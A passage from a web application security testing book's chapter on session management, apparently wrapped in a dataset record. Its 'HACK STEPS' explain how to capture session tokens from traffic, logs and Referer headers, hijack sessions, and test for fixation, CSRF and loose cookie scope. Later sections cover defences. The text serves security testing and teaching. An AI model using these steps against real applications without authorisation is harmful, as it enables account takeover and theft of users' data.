in which a new session token is received. Pay particular atten-\ntion to login functions and transitions between HTTTP and HTTPS com-\nmunications. This can be achieved manually using a network sniffer such\nas Wireshark or partially automated using the logging functions of your\nintercepting proxy:\n■ If HTTP cookies are being used as the transmission mechanism for ses-\nsion tokens, verify whether the secureflag is set, preventing them from\never being transmitted over unencrypted connections.\n■ Determine whether, in the normal use of the application, session tokens\nare ever transmitted over an unencrypted connection. If so, they should\nbe regarded as vulnerable to interception.\n■ Where the start page uses HTTP, and the application switches to HTTPS\nfor the login and authenticated areas of the site, verify whether a new\ntoken is issued following login, or whether a token transmitted during\nthe HTTP stage is still being used to track the user’s authenticated ses-\nsion. Also verify whether the application will accept login over HTTP if\nthe login URL is modified accordingly.\n■ Even if the application uses HTTPS for every single page, verify whether\nthe server is also listening on port 80, running any service or content\nwhatsoever. If so, visit any HTTP URL directly from with an authenticated\nsession and verify whether the session token is transmitted.\n■ In cases where a token for an authenticated session is transmitted to the\nserver over HTTP, verify whether that token continues to be valid or is\nimmediately terminated by the server.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 196\n196 Chapter 7 ■ Attacking Session Management\nDisclosure of Tokens in Logs\nAside from the clear-text transmission of session tokens in network communi-\ncations, the most common place where tokens are simply disclosed to unau-\nthorized view is in system logs of various kinds. Although it is a rarer\noccurrence, the consequences of this kind of disclosure are usually more seri-\nous because those logs may be viewed by a far wider range of potential attack-\ners, and not just by someone who is suitably positioned to eavesdrop on the\nnetwork.\nMany applications provide functionality for administrators and other sup-\nport personnel to monitor and control aspects of the application’s runtime\nstate, including user sessions. For example, a helpdesk worker assisting a user\nwho is having problems may ask for their username, locate their current ses-\nsion through a list or search function, and view relevant details about the ses-\nsion. Or an administrator may consult a log of recent sessions in the course of\ninvestigating a security breach. Often, this kind of monitoring and control\nfunctionality discloses the actual session token associated with each session.\nAnd often, the functionality is poorly protected, allowing unauthorized users\nto access the list of current session tokens, and thereby hijack the sessions of all\napplication users.\nThe other main cause of session tokens appearing in system logs is where an\napplication uses the URL query string as a mechanism for transmitting tokens,\nas opposed to using HTTP cookies or the body of POSTrequests. For example,\ngoogling for inurl:jsessionid identifies thousands of applications that\ntransmit the Java platform session token (called jsessionid) within the URL:\nhttp://www.webjunction.org/do/Navigation;jsessionid=\nF27ED2A6AAE4C6DA409A3044E79B8B48?category=327\nWhen applications transmit their session tokens in this way, it is likely that\ntheir session tokens will appear in various system logs to which unauthorized\nparties may have access, for example:\n■■ Users’ browser logs.\n■■ Web server logs.\n■■ Logs of corporate or ISP proxy servers.\n■■ Logs of any reverse proxies employed within the application’s hosting\nenvironment.\n■■ The Referer logs of any servers that application users visit by following\noff-site links, as in Figure7-4.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 197\nChapter 7 ■ Attacking Session Management 197\nSome of these vulnerabilities will arise even if HTTPS is used throughout\nthe application.\nThe final case just described presents an attacker with a highly effective\nmeans of capturing session tokens in some applications. For example, if a web\nmail application transmits session tokens within the URL, then an attacker can\nsend emails to users of the application containing a link to a web server that he\ncontrols. If any user accesses the link (e.g., because they click on it, or because\ntheir browser loads images contained within HTML-formatted email), then\nthe attacker will receive, in real time, the session token of the user. The attacker\ncan run a simple script on his server to hijack the session of every token\nreceived and perform some malicious action, such as send spam email, harvest\npersonal information, or change passwords.\nNOTE Current versions of Internet Explorer do not include a Referer header\nwhen following off-site links contained in a page that was accessed over\nHTTPS. In this situation, Firefox includes the Referer header provided that the\noff-site link is also being accessed over HTTPS, even if it belongs to a different\ndomain. Hence, sensitive data placed into URLs is vulnerable to leakage in\nReferer logs even where SSL is being used.\nFigure7-4: When session tokens appear in URLs, these will be transmitted\nin the Referer header when users follow an off-site link or their browser\nloads an off-site resource.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 198\n198 Chapter 7 ■ Attacking Session Management\nHACK STEPS\n■ Identify all of the functionality within the application and locate any log-\nging or monitoring functions where session tokens can be viewed. Verify\nwho is able to access this functionality–for example, administrators, any\nauthenticated user, or any anonymous user. See Chapter 4 for techniques\nfor discovering hidden content that is not directly linked from the main\napplication.\n■ Identify any instances within the application where session tokens are\ntransmitted within the URL. It may be that tokens are generally transmit-\nted in a more secure manner but that developers have used the URL in\nspecific cases to work around particular difficulties. For example, this\nbehavior is often observed where a web application interfaces to an\nexternal system.\n■ If session tokens are being transmitted in URLs, attempt to find any\napplication functionality that enables you to inject arbitrary off-site links\ninto pages viewed by other users—for example, functionality implement-\ning a message board, site feedback, question-and-answer, and so on. If\nso, submit links to a web server you control and wait to see whether any\nusers’ session tokens are received in your Referer logs.\n■ If any session tokens are captured, attempt to hijack user sessions by\nusing the application as normal but substituting a captured token for\nyour own. Some intercepting proxies can be configured with regex-based\ncontent replacement rules to automatically modify items such as HTTP\ncookies. If a large number of tokens are captured, and session hijacking\nallows you to access sensitive data such as personal details, payment\ninformation or user passwords, you can use the automated techniques\ndescribed in Chapter 13 to harvest all desired data belonging to other\napplication users.\nVulnerable Mapping of Tokens to Sessions\nVarious common vulnerabilities in session management mechanisms arise\nbecause of weaknesses in the way the application maps the creation and pro-\ncessing of session tokens to individual users’ sessions themselves.\nThe simplest weakness is to allow multiple valid tokens to be concurrently\nassigned to the same user account. In virtually every application, there is no\nlegitimate reason why any user should have more than one session active at\nany given time. Of course, it is fairly frequent for a user to abandon an active\nsession and start a new one—for example, because they have closed a\nbrowser window or have moved to a different computer. But if a user appears\nto be using two different sessions simultaneously, this usually indicates that a\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 199\nChapter 7 ■ Attacking Session Management 199\nsecurity compromise has occurred: either the user has disclosed their creden-\ntials to another party or an attacker has obtained their credentials through\nsome other means. In both cases, permitting concurrent sessions is undesirable\nbecause it allows users to persist in undesirable practices without inconve-\nnience and because it allows an attacker to use captured credentials without\nrisk of detection.\nA related but distinct weakness is for applications to use “static” tokens.\nThese look like session tokens and may initially appear to function like them,\nbut in fact they are no such thing. In these applications, each user is assigned a\ntoken, and this same token is reissued to the user every time he logs in. The\napplication always accepts the token as valid regardless of whether the user\nhas recently logged in and been issued with it. Applications like this really\ninvolve a misunderstanding of the whole concept of what a session is, and the\nbenefits that it provides for managing and controlling access to the applica-\ntion. Sometimes, applications operate like this as a means of implementing\npoorly designed “remember me” functionality, and the static token is accord-\ningly stored in a persistent cookie (see Chapter 6). Sometimes the tokens them-\nselves are vulnerable to prediction attacks, making the vulnerability far more\nserious because rather than compromising the sessions of currently logged-in\nusers, a successful attack will compromise, for all time, the accounts of all reg-\nistered users.\nOther kinds of strange application behavior are also occasionally observed\nthat demonstrate a fundamental defect in the relationship between tokens and\nsessions. One example is where a meaningful token is constructed based upon\na username and a random component. For example, consider the token:\ndXNlcj1kYWY7cjE9MTMwOTQxODEyMTM0NTkwMTI=\nwhich Base64-decodes to:\nuser=daf;r1=13094181213459012\nAfter extensive analysis of the r1 component, we may conclude that this\ncannot be predicted based on a sample of values. However, if the application’s\nsession processing logic is awry, it may be that an attacker simply needs to\nsubmit any valid value as r1 and any valid value as user, in order to access a\nsession under the security context of the specified user. This is essentially an\naccess control vulnerability, because decisions about access are being made on\nthe basis of user-supplied data outside of the session (see Chapter 8). It arises\nbecause the application effectively uses session tokens to signify that the\nrequester has established somekind of valid session with the application; how-\never, the user context in which that session is processed is not an integral prop-\nerty of the session itself but is determined per-request through some other\nmeans. In this case, that means can be directly controlled by the requester.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 200\n200 Chapter 7 ■ Attacking Session Management\nHACK STEPS\n■ Log in to the application twice using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether both sessions remain active concurrently. If so, the application\nsupports concurrent sessions, enabling an attacker who has compro-\nmised another user’s credentials to make use of these without risk of\ndetection.\n■ Log in and log out several times using the same user account, either from\ndifferent browser processes or from different computers. Determine\nwhether a new session token is issued each time or whether the same\ntoken is issued each time you log in. If the latter occurs, then the applica-\ntion is not really employing proper sessions at all.\n■ If tokens appear to contain any structure and meaning, attempt to sepa-\nrate out components that may identify the user from those that appear to\nbe inscrutable. Try to modify any user-related components of the token\nso that they refer to other known users of the application, and verify\nwhether the resulting token (a) is accepted by the application, and (b)\nenables you to masquerade as that user.\nVulnerable Session Termination\nProper termination of sessions is important for two reasons. First, keeping the\nlifespan of a session as short as is necessary reduces the window of opportu-\nnity within which an attacker may capture, guess, or misuse a valid session\ntoken. Second, it provides users with a means of invalidating an existing ses-\nsion when they no longer require it, thereby enabling them to reduce this win-\ndow further and to take some responsibility for securing their session in a\nshared computing environment. The main weaknesses in session termination\nfunctions involve failures to meet these two key objectives.\nSome applications do not enforce effective session expiration. Once created, a\nsession may remain valid for many days after the last request is received, before\nit is eventually cleaned up by the server. If tokens are vulnerable to some kind of\nsequencing flaw that is particularly difficult to exploit (for example, 100,000\nguesses for each valid token identified), an attacker may still be able to capture\nthe tokens of every user who has accessed the application in the recent past.\nSome applications do not provide effective logout functionality:\n■■ In some cases, a logout function is simply not implemented. Users have\nno means of causing the application to invalidate their session.\n■■ In some cases, the logout function does not actually cause the server to\ninvalidate the session. The server removes the token from the user’s\nbrowser (for example, by issuing a Set-Cookieinstruction to blank the\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 201\nChapter 7 ■ Attacking Session Management 201\ntoken). However, if the user continues to submit the token, then it is still\naccepted by the server.\n■■ In the worst cases, when a user clicks Logout, this fact is not communi-\ncated to the server at all, and so the server performs no action whatso-\never. Rather, a client-side script is executed that blanks the user’s\ncookie, meaning that subsequent requests return the user to the login\npage. An attacker who gains access to this cookie could use the session\nas if the user had never logged out.\nHACK STEPS\n■ Do not fall into the trap of examining actions that the application per-\nforms on the client-side token (such as cookie invalidation via a new\nSet-Cookieinstruction, client-side script, or an expiration time\nattribute). In terms of session termination, nothing much depends upon\nwhat happens to the token within the client browser. Rather, investigate\nwhether session expiration is implemented on the server side:\n■ Log in to the application to obtain a valid session token.\n■ Wait for a period without using this token, and then submit a request\nfor a protected page (e.g., “my details”) using the token.\n■ If the page is displayed as normal, then the token is still active.\n■ Use trial and error to determine how long any session expiration time-\nout is, or whether a token can still be used days after the last request\nusing it. Burp Intruder can be configured to increment the time inter-\nval between successive requests, to automate this task.\n■ Determine whether a logout function exists and is prominently made\navailable to users. If not, users are more vulnerable because they have\nno means of causing the application to invalidate their session.\n■ Where a logout function is provided, test its effectiveness. After logging\nout, attempt to reuse the old token and determine whether it is still\nvalid. If so, users remain vulnerable to some session hijacking attacks\neven after they have “logged out.”\nClient Exposure to Token Hijacking\nThere are various ways in which an attacker can target other users of the appli-\ncation in an attempt to capture or misuse the victim’s session token:\n■■ An obvious payload for cross-site scripting attacks is to query the user’s\ncookies to obtain their session token, which can then be transmitted to\nan arbitrary server controlled by the attacker. All of the various permu-\ntations of this attack are described in detail in Chapter 12.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 202\n202 Chapter 7 ■ Attacking Session Management\n■■ Various other attacks against users can be used to hijack the user’s ses-\nsion in different ways. These include session fixation vulnerabilities,\nwhere an attacker feeds a known session token to a user, waits for them\nto log in, and then hijacks their session; as well as cross-site request\nforgery attacks, in which an attacker makes a crafted request to an\napplication from a web site that he controls, and exploits the fact that\nthe user’s browser automatically submits her current cookie with this\nrequest. These attacks are also described in Chapter 12.\nHACK STEPS\n■ Identify any cross-site scripting vulnerabilities within the application and\ndetermine whether these can be exploited to capture the session tokens\nof other users (see Chapter 12).\n■ If the application issues session tokens to unauthenticated users, obtain a\ntoken and perform a login. If the application does not issue a fresh token\nfollowinga successful login, then it is vulnerable to session fixation.\n■ Even if the application does not issue session tokens to unauthenticated\nusers, obtain a token by logging in, and then return to the login page. If\nthe application is willing to return this page even though you are already\nauthenticated, submit another login as a different user using the same\ntoken. If the application does not issue a fresh token after the second\nlogin, then it is vulnerable to session fixation.\n■ Identify the format of session tokens used by the application. Modify\nyour token to an invented value that is validly formed, and attempt to\nlogin. If the application allows you to create an authenticated session\nusing an invented token, then it is vulnerable to session fixation.\n■ If the application does not support login, but processes sensitive user\ninformation (such as personal and payment details), and allows this to\nbe displayed after submission (e.g., on a “verify my order” page), then\ncarry out the previous three tests in relation to the pages displaying sen-\nsitive data. If a token set during anonymous usage of the application can\nlater be used to retrieve sensitive user information, then the application\nis vulnerable to session fixation.\n■ If the application uses HTTP cookies to transmit session tokens, then it\nmay well be vulnerable to cross-site request forgery (XSRF). First, log in to\nthe application. Then confirm that a request made to the application but\noriginating from a page of a different application results in submission of\nthe user’s token. (This submission will need to be made from a window of\nthe same browser process as was used to log in to the target application.)\nAttempt to identify any sensitive application functions all of whose para-\nmeters can be determined in advance by an attacker, and exploit this to\ncarry out unauthorized actions within the security context of a target user.\nSee Chapter 12 for more details on how to execute XSRF attacks.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 203\nChapter 7 ■ Attacking Session Management 203\nLiberal Cookie Scope\nThe usual simple summary of how cookies work is that the server issues a\ncookie using the HTTP response header Set-cookie, and the browser then\nresubmits this cookie in subsequent requests to the same server using the\nCookieheader. In fact, matters are rather more subtle than this.\nThe cookie mechanism allows a server to specify both the domain and the\nURL path to which each cookie will be resubmitted. To do this, it uses the domain\nand pathattributes that may be included in the Set-cookieinstruction.\nCookie Domain Restrictions\nWhen the application residing at foo.wahh-app.comsets a cookie, the browser\nwill by default resubmit the cookie in all subsequent requests to foo.wahh-\napp.com, and also to any subdomains, such as admin.foo.wahh-app.com. It will\nnot submit the cookie to any other domains, including the parent domain wahh-\napp.comand any other subdomains of the parent, such as bar.wahh-app.com.\nA server can override this default behavior by including a domainattribute\nin the Set-cookie instruction. For example, suppose that the application at\nfoo.wahh-app.comreturns the following HTTP header:\nSet-cookie: sessionId=19284710; domain=wahh-app.com;\nThe browser will then resubmit this cookie to all subdomains of wahh-app.com,\nincluding bar.wahh-app.com.\nNOTE A server cannot specify just any domain using this attribute. First, the\ndomain specified must be either the same domain as the application is running\non or a domain that is its parent (either immediately or at some remove).\nSecond, the domain specified cannot be a top-level domain such as .comor\n.co.uk, because this would enable a malicious server to set arbitrary cookies\non any other domain. If the server violates one of these rules, the browser will\nsimply ignore the Set-cookieinstruction.\nIf an application sets a cookie’s domain scope as unduly liberal, this may\nexpose the application to various security vulnerabilities.\nFor example, consider a blogging application that allows users to register,\nlog in, write blog posts, and read other people’s blogs. The main application is\nlocated at the domain wahh-blogs.com, and when users log in to the applica-\ntion they receive a session token in a cookie that is scoped to this domain. Each\nuser is able to create blogs that are accessed via a new subdomain which is pre-\nfixed by their username, for example:\nherman.wahh-blogs.com\nsolero.wahh-blogs.com\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 204\n204 Chapter 7 ■ Attacking Session Management\nBecause cookies are automatically resubmitted to every subdomain within\ntheir scope, when a user who is logged in browses the blogs of other users,\ntheir session token will be submitted with their requests. If blog authors are\npermitted to place arbitrary JavaScript within their own blogs (as is usually\nthe case in real-world blog applications), then a malicious blogger will be able\nto steal the session tokens of other users in the same way as is done in a stored\ncross-site scripting attack (see Chapter 12).\nThe problem arises because user-authored blogs are created as subdomains\nof the main application that handles authentication and session management.\nThere is no facility within HTTP cookies for the application to prevent cookies\nissued by the main domain from being resubmitted to its subdomains.\nThe solution is to use a different domain name for the main application (for\nexample, www.wahh-blogs.com), and scope the domain of its session token\ncookies to this fully qualified name. The session cookie will not then be sub-\nmitted when a logged-in user browses the blogs of other users.\nA different version of this vulnerability arises when an application explicitly\nsets the domain scope of its cookies to a parent domain. For example, suppose\nthat a security-critical application is located at the domain sensitiveapp\n.wahh-organization.com. When it sets cookies, it explicitly liberalizes their\ndomain scope, as follows:\nSet-cookie: sessionId=12df098ad809a5219; domain=wahh-organization.com\nThe consequence of this is that the sensitive application’s session token cook-\nies will be submitted when a user visits everysubdomain used by wahh-orga-\nnization.com, including:\nwww.wahh-organization.com\ntestapp.wahh-organization.com\nAlthough these other applications may all belong to the same organization\nas the sensitive application, it is undesirable for the sensitive application’s\ncookies to be submitted to other applications, for several reasons:\n■■ The personnel responsible for the other applications may have a differ-\nent level of trust than those responsible for the sensitive application.\n■■ The other applications may contain functionality which enables third\nparties to obtain the value of cookies submitted to the application, as in\nthe previous blogging example.\n■■ The other applications may not have been subjected to the same secu-\nrity standards or testing as the sensitive application (e.g., because they\nare less important, do not handle sensitive data, or have been created\nonly for test purposes). Many kinds of vulnerability that may exist in\nthose applications (for example, cross-site scripting vulnerabilities) may\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 205\nChapter 7 ■ Attacking Session Management 205\nbe irrelevant to the security posture of those applications but could\nenable an external attacker to leverage an insecure application in order\nto capture session tokens created by the sensitive application.\nCookie Path Restrictions\nWhen the application residing at /apps/secure/foo-app/index.jsp sets a\ncookie, the browser will by default resubmit the cookie in all subsequent\nrequests to the path /apps/secure/foo-app/, and also to any subdirectories. It\nwill not submit the cookie to the parent directory or to any other directory\npaths that exist on the server.\nAs with domain-based restrictions on cookie scope, a server can override\nthis default behavior by including a pathattribute in the Set-cookieinstruc-\ntion. For example, if the application returns the following HTTP header:\nSet-cookie: sessionId=187ab023e09c00a881a; path=/apps/;\nthe browser will then resubmit this cookie to all subdirectories of the /apps/\npath.\nNOTE If the application specifies a path attribute that does not contain a\ntrailing slash, then the browser will not interpret this as representing an actual\ndirectory. Rather it will submit the cookie to any paths that match the pattern\nspecified. For example, if the application specifies a path scope of /apps, then\nthe browser will submit its cookies to the paths /apps-test/and /apps-\nold/and all of their subdirectories, in addition to the path /apps/. This\nbehavior is probably not what the developer intended.\nIt is surprisingly common to encounter applications that explicitly liberalize\nthe path scope of their cookies to the web server root (/). In this situation, the\napplication’s cookies will be submitted to every application accessible via the\nsame domain name. For example:\n/apps/secure/bar-app/\n/apps/test/\n/blogs/users/solero/\nLiberalizing a cookie’s path scope can leave an application vulnerable in the\nsame way as when an application sets the domain scope of a cookie to its par-\nent domain. If a security-critical application sets a cookie with its path scope\nset to the web server root, and a less secure application resides at some other\npath, then the cookies issued by the former application will be submitted to\nthe latter. This will enable an attacker to leverage any weakness in the less\nsecure application as a means of attacking sessions on the more secure target."
  },
  {
    "input": "Securing Session Management",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 206\n206 Chapter 7 ■ Attacking Session Management\nNOTE In certain circumstances it may be possible to circumvent cookie path\nrestrictions, enabling a malicious web site residing at one path to access the\ncookies belonging to an application at a different path. Hence, the path\nattribute should not be relied upon to be completely reliable. See the following\npaper by Amit Klein for more details:\nwww.webappsec.org/lists/websecurity/archive/2006-03/\nmsg00000.html\nHACK STEPS\nReview all of the cookies issued by the application, and check for any domain\nor pathattributes used to control of the scope of the cookies.\n■ If an application explicitly liberalizes its cookies’ scope to a parent\ndomain or parent directory, then it may be leaving itself vulnerable to\nattacks via other web applications.\n■ If an application sets its cookies’ domain scope to its own domain name\n(or does not specify a domain attribute), then it may still be exposed to\napplications or functionality accessible via subdomains.\n■ If an application specifies its cookies’ path scope without using a trailing\nslash, then it might be exposed to other applications residing at paths\ncontaining a prefix that matches the specified scope.\nIdentify all of the possible domain names and paths that will receive the\ncookies issued by the application. Establish whether any other web application\nor functionality is accessible via these domain names or paths that you may be\nable to leverage to obtain the cookies issued to users of the target application.\nSecuring Session Management\nThe defensive measures that web applications must take to prevent attacks on\ntheir session management mechanisms correspond to the two broad cate-\ngories of vulnerability that affect those mechanisms. In order to perform ses-\nsion management in a secure manner, an application must generate its tokens\nin a robust way and must protect these tokens throughout their lifecycle from\ncreation to disposal.\nGenerate Strong Tokens\nThe tokens used to re-identify a user between successive requests should be\ngenerated in a manner that does not provide any scope for an attacker who\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 207\nChapter 7 ■ Attacking Session Management 207\nobtains a large sample of tokens from the application in the usual way to pre-\ndict or extrapolate the tokens issued to other users.\nThe most effective token generation mechanisms are those that:\n(a) use an extremely large set of possible values, and\n(b) contain a strong source of pseudo-randomness, ensuring an even and\nunpredictable spread of tokens across the range of possible values.\nIn principle, any item of arbitrary length and complexity may be guessed\nusing brute force given sufficient time and resources. The objective of design-\ning a mechanism for generating strong tokens is that it should be extremely\nunlikely that a determined attacker with large amounts of bandwidth and pro-\ncessing resources should be successful in guessing a single valid token within\nthe lifespan of its validity.\nTokens should consist of nothing more than an identifier used by the server\nto locate the relevant session object to be used for processing the user’s\nrequest. The token should contain no meaning or structure, either overtly or\nwrapped in layers of encoding or obfuscation. All data about the session’s\nowner and status should be stored on the server in the session object to which\nthe session token corresponds.\nCare should be taken when selecting a source of randomness. Developers\nshould be aware that the various sources available to them are likely to differ\nin strength very significantly. Some, as with java.util.Random, are perfectly\nuseful for many purposes where a source of changing input is required, but\ncan be extrapolated in both forward and reverse directions with perfect cer-\ntainty on the basis of a single item of output. Developers should investigate\nthe mathematical properties of the actual algorithms used within different\navailable sources of randomness and should read relevant documentation\nabout the recommended uses of different APIs. In general, if an algorithm is\nnot explicitly described as being cryptographically secure, it should be\nassumed to be predictable.\nNOTE Some high-strength sources of randomness take some time to return\nthe next value in their output sequence because of the steps they take to\nobtain sufficient entropy (from system events, etc.) and so may not deliver\nvalues sufficiently fast to generate tokens for some high-volume applications.\nIn addition to selecting the most robust source of randomness that is feasi-\nble, a good practice is to introduce as a source of entropy some information\nabout the individual request for which the token is being generated. This\ninformation may not be unique to that request, but it can be very effective in\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 208\n208 Chapter 7 ■ Attacking Session Management\nmitigating any weaknesses in the core pseudo-random number generator\nbeing used. Examples of information that may be incorporated include:\n■■ The source IP address and port number from which the request was\nreceived.\n■■ The User-Agentheader in the request.\n■■ The time of the request in milliseconds.\nA highly effective formula for incorporating this entropy is to construct a\nstring that concatenates a pseudo-random number, a variety of request-\nspecific data as listed, and a secret string known only to the server and gener-\nated afresh on each reboot. A suitable hash is then taken of this string (using,\nfor example, SHA-256 at the time of this writing), to produce a manageable\nfixed-length string that can be used as a token. (Placing the most variable items\ntowards the start of the hash’s input serves to maximize the “avalanche” effect\nwithin the hashing algorithm.)\nTIP Having decided upon an algorithm for generating session tokens, a useful\n“thought experiment” is to imagine that your source of pseudo-randomness is\ntotally broken and always returns the same value. In this eventuality, would an\nattacker who obtains a large sample of tokens from the application be able to\nextrapolate tokens issued to other users? Using the formula described here,\nthis will in general be highly unlikely, even with full knowledge of the algorithm\nused. The source IP, port number, User-Agentheader, and time of request\ntogether generate a vast amount of entropy. And even with full knowledge of\nthese, the attacker will not be able to produce the corresponding token without\nknowing the secret string used by the server.\nProtect Tokens throughout Their Lifecycle\nHaving created a robust token whose value cannot be predicted, this token\nneeds to be protected throughout its lifecycle from creation to disposal, to\nensure that it is not disclosed to anyone other than the user to whom it is\nissued:\n■■ The token should only ever be transmitted over HTTPS. Any token\ntransmitted in clear text should be regarded as tainted—that is, as not\nproviding assurance of the user’s identity. If HTTP cookies are being\nused to transmit tokens, these should be flagged as secureto prevent\nthe user’s browser from ever transmitting them over HTTP. If feasible,\nHTTPS should be used for every page of the application, including sta-\ntic content such as help pages, images, and so on. If this is not desired\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 209\nChapter 7 ■ Attacking Session Management 209\nand an HTTP service is still implemented, the application should redi-\nrect any requests for sensitive content (including the login page) back to\nthe HTTPS service. Static resources such as help pages are not usually\nsensitive and may be accessed without any authenticated session;\nhence, the use of secure cookies can be backed up using cookie scope\ninstructions to prevent tokens being submitted in requests for these\nresources.\n■■ Session tokens should never be transmitted in the URL, as this provides\na trivial vehicle for session fixation attacks and results in tokens appear-\ning in numerous logging mechanisms. In some cases, developers use\nthis technique to implement sessions in browsers that have cookies dis-\nabled. However, a better means of achieving this is to use POSTrequests\nfor all navigation and store tokens in a hidden field of an HTML form.\n■■ Logout functionality should be implemented. This should dispose of all\nsession resources held on the server and invalidate the session token.\n■■ Session expiration should be implemented after a suitable period of\ninactivity (e.g., 10 minutes). This should result in the same behavior as\nif the user had explicitly logged out.\n■■ Concurrent logins should be prevented. Each time a user logs in, a dif-\nferent session token should be issued, and any existing session belong-\ning to the user should be disposed of as if she had logged out from it.\nWhen this occurs, the old token may be stored for a period and any\nsubsequent requests received using the token should return a security\nalert to the user stating that the session has been terminated because\nshe has logged in from a different location.\n■■ If the application contains any administrative or diagnostic functional-\nity that enables session tokens to be viewed, this functionality should\nbe robustly defended against unauthorized access. In most cases, there\nis no necessity for this functionality to display the actual session token\nat all—rather, it should contain sufficient details about the owner of\nthe session for any support and diagnostic tasks to be performed, with-\nout divulging the session token being submitted by the user to identify\nher session.\n■■ The domain and path scope of an application’s session cookies should\nbe set as restrictively as possible. Cookies with overly liberal scope are\noften generated by poorly configured web application platforms or web\nservers, rather than by the application developers themselves. There\nshould be no other web applications or untrusted functionality accessi-\nble via domain names or URL paths that are included within the scope\nof the application’s cookies. Particular attention should be paid to any\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 210\n210 Chapter 7 ■ Attacking Session Management\nexisting subdomains to the domain name that is used to access the\napplication. In some cases, to ensure that this vulnerability does not\narise, it may be necessary to modify the domain- and path-naming\nscheme employed by the various applications in use within the\norganization.\nSpecific measures should be taken to defend the session management mech-\nanism against the variety of attacks with which the application’s users may\nfind themselves targeted:\n■■ The application’s codebase should be rigorously audited to identify and\nremove any cross-site scripting vulnerabilities (see Chapter 12). Most\nsuch vulnerabilities can be exploited to attack session management\nmechanisms. In particular, stored (or second-order) XSS attacks can usu-\nally be exploited to defeat every conceivable defense against session\nmisuse and hijacking.\n■■ Arbitrary tokens submitted by users that the server does not recognize\nshould not be accepted. The token should be immediately canceled\nwithin the browser, and the user should be returned to the application’s\nstart page.\n■■ Cross-site request forgery and other session attacks can be made more\ndifficult by requiring two-step confirmation and/or reauthentication\nbefore critical actions such as funds transfers are carried out.\n■■ Cross-site request forgery attacks can be defended against by not rely-\ning solely upon HTTP cookies for transmitting session tokens. Using\nthe cookie mechanism introduces the vulnerability because cookies are\nautomatically submitted by the browser regardless of what caused the\nrequest to take place. If tokens are always transmitted in a hidden field\nof an HTML form, then an attacker cannot create a form whose submis-\nsion will cause an unauthorized action unless he already knows the\nvalue of the token, in which case he can simply perform a trivial hijack-\ning attack. Per-page tokens can also help prevent these attacks (see the\nfollowing section).\n■■ A fresh session should always be created after successful authentica-\ntion, to mitigate the effects of session fixation attacks. Where an applica-\ntion does not use authentication but does allow sensitive data to be\nsubmitted, the threat posed by fixation attacks is harder to address.\nOne possible approach is to keep the sequence of pages where sensitive\ndata is submitted as short as possible, and either (a) create a new ses-\nsion at the first page of this sequence (where necessary, copying from\nthe existing session any required data, such as the contents of a shop-\nping cart), or (b) use per-page tokens (described in the following sec-\ntion) to prevent an attacker who knows the token used in the first page\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 211\nChapter 7 ■ Attacking Session Management 211\nfrom accessing subsequent pages. Except where strictly necessary, per-\nsonal data should not be displayed back to the user at all. Even where\nthis is required (e.g., a “confirm order” page showing addresses), sensi-\ntive items such as credit card numbers and passwords should neverbe\ndisplayed back to the user and should always be masked within the\nsource of the application’s response.\nPer-Page Tokens\nFiner-grained control over sessions can be achieved, and many kinds of session\nattacks made more difficult or impossible, by using per-page tokens in addition to\nsession tokens. Here, a new page token is created every time a user requests an\napplication page (as opposed to an image, for example) and is passed to the client\nin a cookie or a hidden field of an HTML form. Each time the user makes a\nrequest, the page token is validated against the last value issued, in addition to the\nnormal validation of the main session token. In the case of a non-match, the entire\nsession is terminated. Many of the most security-critical web applications on the\nInternet, such as online banks, employ per-page tokens to provide increased pro-\ntection for their session management mechanism, as shown in Figure7-5.\nFigure7-5: Per-page tokens used in a banking application\nWhile the use of per-page tokens does impose some restrictions on navigation\n(for example, on use of the back and forward buttons and multi-window brows-\ning), it effectively prevents session fixation attacks and ensures that the simulta-\nneous use of a hijacked session by a legitimate user and an attacker will quickly\nbe blocked after both have made a single request. Per-page tokens can also be\nleveraged to track the user’s location and movement through the application,\nand used to detect attempts to access functions out of a defined sequence, help-\ning to protect against certain access control defects (see Chapter 8).\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 212\n212 Chapter 7 ■ Attacking Session Management\nLog, Monitor, and Alert\nThe application’s session management functionality should be closely inte-\ngrated with its mechanisms for logging, monitoring, and alerting, in order to\nprovide suitable records of anomalous activity and enable administrators to\ntake defensive actions where necessary:\n■■ The application should monitor requests that contain invalid tokens.\nExcept in the most trivially predictable cases, a successful attack\nattempting to guess the tokens issued to other users will typically\ninvolve issuing large numbers of requests containing invalid tokens,\nleaving a noticeable mark in the application’s logs.\n■■ Brute-force attacks against session tokens are difficult to block altogether,\nbecause there is no particular user account or session that can be disabled\nto stop the attack. One possible action is to block source IP addresses for\na period when a number of requests containing invalid tokens have been\nreceived. However, this may be ineffective when one user’s requests orig-\ninate from multiple IP addresses (e.g., AOL users) or when multiple\nusers’ requests originate from the same IP address (e.g., users behind a\nproxy or a firewall performing network address translation).\n■■ Even if brute-force attacks against sessions cannot be effectively pre-\nvented in real time, keeping detailed logs and alerting administrators\nenables them to investigate the attack and take appropriate action\nwhere they are able to.\n■■ Wherever possible, users should be alerted to anomalous events relat-\ning to their session—for example, concurrent logins or apparent\nhijacking (detected using per-page tokens). Even though a compromise\nmay already have occurred, this enables the user to check whether any\nunauthorized actions such as funds transfers have taken place.\nReactive Session Termination\nThe session management mechanism can be leveraged as a highly effective\ndefense against many kinds of other attacks against the application. Some\ns ecurity-critical applications such as online banking are extremely aggressive in\nterminating a user’s session every time the user submits some anomalous\nrequest—for example, any request containing a modified hidden HTML form\nfield or URL query string parameter, any request containing strings associated\nwith SQL injection or cross-site scripting attacks, and any user input that would\nnormally have been blocked by client-side checks such as length restrictions.\nOf course, any actual vulnerabilities that may be exploited using such\nrequests need to be addressed at source. But forcing users to 